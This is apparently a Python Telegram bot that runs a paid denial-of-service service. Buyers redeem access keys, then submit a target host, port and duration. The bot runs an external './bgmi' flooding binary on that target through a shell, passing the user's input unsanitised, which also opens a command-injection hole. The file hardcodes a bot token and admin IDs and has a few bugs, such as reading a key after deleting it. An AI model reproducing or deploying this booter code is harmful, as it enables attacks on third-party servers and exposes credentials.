import telebot
import subprocess
import datetime
import os
import logging
import time
import random
import string
import threading
from pytz import timezone
from telebot.types import ReplyKeyboardMarkup, KeyboardButton

# Configure logging
logging.basicConfig(filename='bot.log', level=logging.DEBUG, format='%(asctime)s - %(levelname)s - %(message)s')

# Telegram Bot Token
bot = telebot.TeleBot('7563083106:AAHhDgtOgiJQ2EDGhTTqt3MTV4bPhBOVQLo')

# Owner and Admin IDs
owner_id = "6281757332"
admin_ids = ["6281757332", "7455845970"]

# Files for user and key management
USER_FILE = "users.txt"
KEYS_FILE = "keys.txt"

# Data storage
user_last_attack = {}
redeemed_keys = {}
keys = {}
allowed_user_ids = []

# Read users from file
def read_users():
    try:
        with open(USER_FILE, "r") as file:
            return [line.strip() for line in file.readlines()]
    except FileNotFoundError:
        return []

allowed_user_ids = read_users()

# Read keys from file
def read_keys():
    try:
        with open(KEYS_FILE, "r") as file:
            for line in file.readlines():
                parts = line.strip().split()
                if len(parts) == 2:
                    key, expiration = parts
                    keys[key] = {
                        "expiration": datetime.datetime.strptime(expiration, "%Y-%m-%d %H:%M:%S"),
                        "user": None
                    }
    except FileNotFoundError:
        logging.warning(f"{KEYS_FILE} not found.")

read_keys()

# Convert to IST time zone
def convert_to_ist(timestamp):
    ist = timezone('Asia/Kolkata')
    return timestamp.astimezone(ist)

# Check cooldown
def check_cooldown(user_id):
    current_time = time.time()
    last_attack_time = user_last_attack.get(user_id, 0)
    return max(0, 120 - (current_time - last_attack_time))

# Normal Keyboard
def get_main_menu():
    markup = ReplyKeyboardMarkup(resize_keyboard=True)
    markup.row(
        KeyboardButton("🚀 Attack"),
        KeyboardButton("ℹ️ My Info")
    )
    markup.row(
        KeyboardButton("🔑 Redeem")
    )
    return markup

# Start command
@bot.message_handler(commands=['start'])
def start(message):
    welcome_message = "🎉 **Welcome!** Use the buttons below to navigate."
    bot.send_message(message.chat.id, welcome_message, reply_markup=get_main_menu())

# Respond to "🚀 Attack" button press (trigger the attack function directly)
@bot.message_handler(func=lambda message: message.text == "🚀 Attack")
def attack_button_pressed(message):
    user_id = str(message.chat.id)
    if user_id in allowed_user_ids:
        # Ask for attack details immediately after the button press
        bot.send_message(message.chat.id, "Please enter the attack details in the format: <HOST> <PORT> <TIME>")
        
        # Register the next step handler to process the attack details right after the user replies
        bot.register_next_step_handler(message, process_attack)
    else:
        bot.reply_to(message, "🚫 **Unauthorized Access!** 🚫\n\n"
            "Oops! It seems like you don't have permission to use the /attack command. To gain access and unleash the power of attacks, you can:\n\n"
            "👉 **Contact an Admin or the Owner for approval.**\n"
            "🌟 **Become a proud supporter and purchase approval.**\n"
            "🔑 **Chat with an admin now and level up your capabilities!**\n\n"
            "🚀 Ready to supercharge your experience? Take action and get ready for powerful attacks!.")

# Function to process the attack immediately after user input
def process_attack(message):
    user_id = str(message.chat.id)
    
    if user_id in allowed_user_ids:
        # Check cooldown before allowing the attack
        wait_time = check_cooldown(user_id)
        if wait_time > 0:
            bot.reply_to(message, f"⏳ **Cooldown Active!** Wait {wait_time:.2f} seconds.")
            return

        command = message.text.split()
        if len(command) == 3:
            target, port, duration = command[0], int(command[1]), int(command[2])

            if duration > 180:
                bot.reply_to(message, "❌ **Duration must be 180 seconds or less.**")
                return

            # Set last attack time to current time
            user_last_attack[user_id] = time.time()

            # Response before attack
            response = (
                "🚀 Attack Initiated! 💥**\n"
                f"🗺️Target IP: {target}\n"
                f"🔌Target Port: {port}\n"
                f"⏳Duration: {duration} seconds\n"
            )
            bot.reply_to(message, response)
            
            # Execute the attack (mocked by subprocess)
            subprocess.run(f"./bgmi {target} {port} {duration} 900", shell=True)

            # Notify the user that the attack has been successfully sent
            bot.send_message(message.chat.id, "✅ **Attack sent successfully!**")

        else:
            # Attack is processed if valid format
            pass
    else:
        bot.reply_to(message, "🚫 **Unauthorized Access!** You don't have permission to use the attack feature.")
        
# Respond to "ℹ️ My Info" button press
@bot.message_handler(func=lambda message: message.text == "ℹ️ My Info")
def my_info_button_pressed(message):
    user_id = str(message.chat.id)
    if user_id in allowed_user_ids:
        user_key = next((k for k, v in keys.items() if v["user"] == user_id), None)
        expiration_time = keys[user_key]["expiration"] if user_key else None

        if expiration_time and expiration_time < datetime.datetime.now():
            response = "🚫 **Your key has expired. Access removed.**"
            if user_key:
                keys[user_key]["user"] = None
        else:
            response = (
                f"🔑 **User Info**\n"
                f"🆔 **User ID:** {user_id}\n"
                f"🗝️ **Key:** {user_key if user_key else 'Not Redeemed'}\n"
                f"⏳ **Expires:** {convert_to_ist(expiration_time).strftime('%Y-%m-%d %H:%M:%S')} (IST)\n"
                f"✅ **Access:** Granted"
            ) if user_key else "🚫 **No active key found.**"
    else:
        response = (
            "🚫 **Unauthorized Access!** 🚫\n\n"
            "Oops! You **don't have permission** to view your information.\n\n"
            "Want access? Contact an admin to request approval.\n"
        )
    bot.send_message(message.chat.id, response)

# Respond to "🔑 Redeem" button press
@bot.message_handler(func=lambda message: message.text == "🔑 Redeem")
def redeem_button_pressed(message):
    user_id = str(message.chat.id)
    bot.send_message(message.chat.id, "⚠️ **Usage:** /redeem <key")

# Redeem key
@bot.message_handler(commands=['redeem'])
def redeem_key(message):
    user_id = str(message.chat.id)
    command = message.text.split()

    if len(command) == 2:
        key = command[1]
        if key in keys and keys[key]["expiration"] > datetime.datetime.now():
            if keys[key]["user"] is None:
                keys[key]["user"] = user_id
                allowed_user_ids.append(user_id)
                with open(USER_FILE, "a") as file:
                    file.write(f"{user_id}\n")
                response = "✅ **Key Redeemed! You now have access.**"
                logging.info(f"User {user_id} redeemed key {key}.")
            else:
                response = "❌ **This key has already been used!**"
        else:
            response = "❌ **Invalid or expired key!**"
    else:
        response = "⚠️ **Usage:** /redeem <key>"
    
    bot.send_message(message.chat.id, response)

# Handle the /key generate command
@bot.message_handler(commands=['key'])
def generate_key(message):
    user_id = str(message.chat.id)
    if user_id == owner_id or user_id in admin_ids:
        command = message.text.split()
        
        if len(command) == 2 and command[1] == "generate":
            key = ''.join(random.choices(string.ascii_letters + string.digits, k=16))  # Generate a 16-character key
            expiration_date = datetime.datetime.now() + datetime.timedelta(days=1)  # Default is 1 day from now
            keys[key] = {
                "expiration": expiration_date,
                "user": None  # No user redeemed yet
            }
            
            # Save the key and expiration time to the file
            with open(KEYS_FILE, "a") as file:
                file.write(f"{key} {expiration_date.strftime('%Y-%m-%d %H:%M:%S')}\n")
            
            response = f"🗝️ **Key generated successfully!**\nYour key is: {key}\nIt will expire on: {expiration_date.strftime('%Y-%m-%d %H:%M:%S')}"
        elif len(command) == 3 and command[1] == "generate" and command[2].endswith('day'):
            try:
                # Parse the number of days from the command (e.g., "1day")
                days = int(command[2].replace('day', ''))
                key = ''.join(random.choices(string.ascii_letters + string.digits, k=16))  # Generate a 16-character key
                expiration_date = datetime.datetime.now() + datetime.timedelta(days=days)  # Expiration as per input
                keys[key] = {
                    "expiration": expiration_date,
                    "user": None  # No user redeemed yet
                }
                
                # Save the key and expiration time to the file
                with open(KEYS_FILE, "a") as file:
                    file.write(f"{key} {expiration_date.strftime('%Y-%m-%d %H:%M:%S')}\n")
                
                response = f"🗝️ **Key generated successfully!**\nYour key is: {key}\nIt will expire on: {expiration_date.strftime('%Y-%m-%d %H:%M:%S')}"
            except ValueError:
                response = "⚠️ **Invalid duration format!** Please specify like `/key generate 1day`."
        else:
            response = "⚠️ **Usage:** /key generate <duration>"
    else:
        response = "❌ **You are not authorized to generate keys!**"
    
    bot.send_message(message.chat.id, response)
    
# Handle /keyblock command
@bot.message_handler(commands=['keyblock'])
def key_block(message):
    user_id = str(message.chat.id)
    
    # Ensure both the owner and admins can block a key
    if user_id == owner_id or user_id in admin_ids:
        command = message.text.split()
        
        if len(command) == 2:
            key_to_block = command[1]
            blocked_user = None
            
            # Find the user who redeemed the key
            for key, value in keys.items():
                if key == key_to_block:
                    blocked_user = value["user"]
                    break
            
            if blocked_user:
                # Remove the key from the keys dictionary
                del keys[key_to_block]
                
                # Remove the user from the allowed list
                if blocked_user in allowed_user_ids:
                    allowed_user_ids.remove(blocked_user)
                    # Update the user file
                    with open(USER_FILE, "w") as file:
                        for user in allowed_user_ids:
                            file.write(f"{user}\n")
                
                # Notify the admin/owner
                response = f"❌ **User {blocked_user} has been blocked.** Key {key_to_block} has been removed."
                logging.info(f"Key {key_to_block} blocked and user {blocked_user} removed.")
            else:
                response = "❌ **This key is not valid or hasn't been redeemed yet!**"
        else:
            response = "⚠️ **Usage:** /keyblock <key>"
    else:
        response = "❌ **You are not authorized to block keys.**"
    
    bot.send_message(message.chat.id, response)
        
# Handle /code command (for the owner to see all keys)
@bot.message_handler(commands=['allkeys'])
def view_all_keys(message):
    user_id = str(message.chat.id)
    if user_id == owner_id:
        response = "🗝️ **Generated Keys and Their Expiration Times:**\n\n"
        for key, value in keys.items():
            expiration_time_ist = convert_to_ist(value["expiration"])
            response += (f"Key: {key} | Expiration: {expiration_time_ist.strftime('%Y-%m-%d %H:%M:%S %Z%z')}\n")
        
        bot.send_message(message.chat.id, response)
    else:
        bot.send_message(message.chat.id, "❌ **You are not authorized to view the keys!**")

# Handle /approveuser command
@bot.message_handler(commands=['approveuser'])
def approve_user(message):
    user_id = str(message.chat.id)
    if user_id == owner_id:
        command = message.text.split()
        
        if len(command) == 2:
            user_to_approve = command[1]
            if user_to_approve not in allowed_user_ids:
                allowed_user_ids.append(user_to_approve)
                with open(USER_FILE, "a") as file:
                    file.write(f"{user_to_approve}\n")
                bot.send_message(message.chat.id, f"✅ User {user_to_approve} has been approved.")
                logging.info(f"User {user_to_approve} approved by owner.")
            else:
                bot.send_message(message.chat.id, "❌ This user is already approved.")
        else:
            bot.send_message(message.chat.id, "⚠️ **Usage:** /approveuser <user_id>")
    else:
        bot.send_message(message.chat.id, "❌ **You are not authorized to approve users.**")

# Handle /removeuser command
@bot.message_handler(commands=['removeuser'])
def remove_user(message):
    user_id = str(message.chat.id)
    if user_id == owner_id:
        command = message.text.split()
        
        if len(command) == 2:
            user_to_remove = command[1]
            if user_to_remove in allowed_user_ids:
                allowed_user_ids.remove(user_to_remove)
                with open(USER_FILE, "w") as file:
                    for user in allowed_user_ids:
                        file.write(f"{user}\n")
                bot.send_message(message.chat.id, f"❌ User {user_to_remove} has been removed.")
                logging.info(f"User {user_to_remove} removed by owner.")
            else:
                bot.send_message(message.chat.id, "❌ This user is not in the allowed list.")
        else:
            bot.send_message(message.chat.id, "⚠️ **Usage:** /removeuser <user_id>")
    else:
        bot.send_message(message.chat.id, "❌ **You are not authorized to remove users.**")

# Handle /broadcast command
@bot.message_handler(commands=['broadcast'])
def broadcast(message):
    user_id = str(message.chat.id)
    if user_id == owner_id:
        command = message.text.split(maxsplit=1)
        
        if len(command) == 2:
            broadcast_message = command[1]
            for user in allowed_user_ids:
                try:
                    bot.send_message(user, broadcast_message)
                    logging.info(f"Sent broadcast to user {user}")
                except Exception as e:
                    logging.error(f"Error sending broadcast to {user}: {e}")
            bot.send_message(message.chat.id, f"✅ Broadcast sent to all approved users.")
        else:
            bot.send_message(message.chat.id, "⚠️ **Usage:** /broadcast <message>")
    else:
        bot.send_message(message.chat.id, "❌ **You are not authorized to send broadcasts.**")

# Handle /allusers command
@bot.message_handler(commands=['allusers'])
def all_users(message):
    user_id = str(message.chat.id)
    if user_id == owner_id:
        response = "👥 **List of All Approved Users:**\n\n"
        if allowed_user_ids:
            response += "\n".join(allowed_user_ids)
        else:
            response += "No approved users."
        bot.send_message(message.chat.id, response)
    else:
        bot.send_message(message.chat.id, "❌ **You are not authorized to view all users.**")
                        
# Handle /logs command
@bot.message_handler(commands=['logs'])
def view_logs(message):
    user_id = str(message.chat.id)
    if user_id == owner_id:
        with open(LOG_FILE, "r") as log_file:
            logs = log_file.readlines()
        
        response = "📜 **Bot Activity Logs:**\n\n"
        if logs:
            response += "".join(logs[-10:])  # Display last 10 log entries
        else:
            response += "No logs available."
        
        bot.send_message(message.chat.id, response)
    else:
        bot.send_message(message.chat.id, "❌ **You are not authorized to view logs.**")
        
# Main polling loop with automatic key expiry check every hour
def check_key_expirations():
    current_time = datetime.datetime.now()

    # Check for expired keys and remove access
    expired_keys = [key for key, value in keys.items() if value["expiration"] < current_time]

    for key in expired_keys:
        del keys[key]
        # Remove the user from allowed list if they used the expired key
        user_id = keys[key]["user"]
        if user_id in allowed_user_ids:
            allowed_user_ids.remove(user_id)
        logging.info(f"Expired key {key} has been removed.")

def start_polling():
    while True:
        try:
            # Start the bot polling in a separate thread to keep it responsive
            bot.polling(none_stop=True, interval=0)  # none_stop ensures it doesn't stop even if an exception occurs.
        except Exception as e:
            logging.error(f"An error occurred in polling: {e}")
            time.sleep(5)  # Wait for 5 seconds before retrying to handle errors gracefully

def check_expiry_periodically():
    while True:
        check_key_expirations()
        time.sleep(3600)  # Check every hour for expired keys

# Start polling and checking for key expirations in separate threads to run concurrently
if __name__ == "__main__":
    # Create separate threads for polling and checking key expirations
    import threading
    polling_thread = threading.Thread(target=start_polling)
    expiry_thread = threading.Thread(target=check_expiry_periodically)

    # Start both threads
    polling_thread.start()
    expiry_thread.start()

    # Join threads to keep the program running
    polling_thread.join()
    expiry_thread.join()
    